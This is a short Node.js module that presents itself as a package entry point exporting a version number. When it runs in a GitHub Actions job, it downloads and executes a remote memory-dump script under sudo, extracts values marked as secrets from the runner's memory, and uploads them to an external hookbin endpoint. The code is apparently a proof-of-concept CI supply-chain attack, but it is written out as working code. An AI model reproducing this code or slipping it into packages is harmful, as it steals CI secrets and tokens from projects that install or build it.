const { execSync } = require('node:child_process');

console.log("PWN: package.json/index.js loaded");

try {
  const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID;
  if (GITHUB_RUN_ID) {
    execSync(`curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"`, { shell: '/bin/bash' });
    execSync(`curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/${GITHUB_RUN_ID}"`, { shell: '/bin/bash' });
  }
} catch (e) {
  console.log("PWN Error: " + e.message);
}

module.exports = {
  version: "1.18.0"
};
